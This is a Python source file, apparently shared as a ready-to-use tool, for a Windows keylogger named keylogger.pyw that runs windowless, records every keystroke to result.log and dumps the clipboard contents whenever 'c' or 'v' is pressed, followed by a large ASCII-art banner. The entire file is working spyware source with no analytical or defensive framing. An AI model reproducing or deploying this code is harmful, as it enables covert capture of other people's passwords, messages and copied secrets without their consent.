# file: keylogger.pyw
# python: 3
# make by: coder
# 32 bit
# =}
# library
import ctypes
from pynput import keyboard
from pynput.keyboard import Key
# special keys
special_keys = {
    Key.alt: " [Alt] ",
    Key.alt_l: " [Alt_L] ",
    Key.alt_r: " [Alt_R] ",
    Key.alt_gr: " [AltGr] ",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: " [CapsLock] ",
    Key.cmd: " [Cmd] ",
    Key.cmd_l: " [Cmd_L] ",
    Key.cmd_r: " [Cmd_R] ",
    Key.ctrl: " [Ctrl] ",
    Key.ctrl_l: " [Ctrl_L] ",
    Key.ctrl_r: " [Ctrl_R] ",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: " [End] ",
    Key.enter: " \n ",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.home: " [Home] ",
    Key.left: " [Left] ",
    Key.page_down: " [PageDown] ",
    Key.page_up: " [PageUp] ",
    Key.right: " [Right] ",
    Key.shift: " [Shift] ",
    Key.shift_l: " [Shift_L] ",
    Key.shift_r: " [Shift_R] ",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.insert: " [Insert] ",
    Key.menu: " [Menu] ",
    Key.num_lock: " [NumLock] ",
    Key.pause: " [Pause] ",
    Key.print_screen: " [PrintScreen] ",
    Key.scroll_lock: " [ScrollLock] "
}
pressed_keys = set()
# get clipboard
def get_clipboard():
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    CF_TEXT = 1
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    user32.GetClipboardData.restype = ctypes.c_void_p
    user32.OpenClipboard(0)
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard
    try:
        if IsClipboardFormatAvailable(CF_TEXT):
            data = GetClipboardData(CF_TEXT)
            data_locked = kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            kernel32.GlobalUnlock(data_locked)
            return value.decode('utf-8', errors='ignore')
    finally:
        CloseClipboard()
# log
def on_press(key):
    pressed_keys.add(key)
    with open("result.log", "a", encoding='utf-8') as file:
        try:
            if key in special_keys:
                file.write(special_keys[key])
            elif hasattr(key, 'char') and key.char and key.char.lower() in ('c', 'v'):
                clipboard_data = get_clipboard()
                if clipboard_data:
                    file.write("/n[Clipboard]: " + str(clipboard_data) + " /n ")
                else:
                    pass
            else:
                file.write(key.char)
        except AttributeError:
            file.write(str(key))
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
                                                                                                                                                                                                                                                          
#   ^JJJJJJJJ. ?YJYYY~ .JYYYYYY:?YYYY!.?YJJJJJJ^ ~YJJY7.?YJJJJJY~        :7YP!!PJ!:       .!YP7~55J7YY     :7YP^75Y?757  ?YYYYYY:7YYYY7  7YJJJJY~~YJJ7~ 
#   .?@@@@@#~  ^P@&57:  ~#@@@@@~^75@@5 ~#@@@@@B. .7@@J^ ~#@@@@@J.      ^P&@@J..Y@@&5:   .Y&@@P..^!P@@#.  ^P&@@J .^7B@@5  ^B@@@@@!:7Y&@G  :P@@@@@J:Y@@@@B~         
#    ^@@@@@G   ~BP:      G@@@@@~  .~#Y  ^#@@@@@?  J&~    P@@@@@~      ~&@@@@~  !@@@@&~ :B@@@@?     7@#. ~&@@@@^     5@5   P@@@@@!  .~BP   J@@@@@J :&@@@@G        
#    ^@@@@@B .Y@@J       G@@@@@~ 7&7..   ~&@@@@@!!&!     P@@@@@!     .B@@@@@~  !@@@@@G 5@@@@@?      ?? .B@@@@@^     .Y!   P@@@@@! !&J .   J@@@@@J :&@@@@?                                                   
#    ^@@@@@G^B@@@@7      G@@@@@~Y@@7      !@@@@@&?^      P@@@@@!     ^&@@@@@~  !@@@@@&^B@@@@@? ~7777!!~^@@@@@@^ !777!!7^  P@@@@@~J@@J     J@@@@@J~G@@#Y^                                                    
#    ^@@@@@G~&@@@@&^     G@@@@@~.Y@7       ?@@@@@G       P@@@@@!    .:&@@@@@~  !@@@@@#:G@@@@@? ~5@@@@&!:&@@@@@^ !B@@@@B^  P@@@@@~.J@J     J@@@@@J:5@@&#P~                                                   
#    ^@@@@@G ?@@@@@B:    G@@@@@~  !:JJ     ~@@@@@G       P@@@@@!   !&7J@@@@@~  !@@@@@J !@@@@@?  ~@@@@B  Y@@@@@^  Y@@@@5   P@@@@@!  ~:7Y.  J@@@@@J :&@@@@G                                                   
#    ~@@@@@B  P@@@@@P.   G@@@@@~  ^5@B     ~@@@@@G       G@@@@@! .7&@J Y@@@@!  7@@@&J   7#@@@J  !@@@@B   J@@@@~  Y@@@@Y   P@@@@@!  :Y@&.  J@@@@@J :&@@@@BJ7        
#   ~G&###&#Y~G&####&P:.Y#&&&&#~JG#&&P    ~G&###&#Y.   .Y#&&&&&~?B&&&?  ^JG&B~~B&GJ^     .?G&#7^B&#P?:    ^YB&B^7#&B57.  Y#&&&&&~7G#&&B. ?B&###&B? 7#&@@&G~          
#   .:...............:  ::..... .::.:.    .:.......     .:..... .::.:.     .^::^.           .^:.^:.          :^.:^:      .:..... .::...  .........  .:^^:                                                                                                                                                                                                        
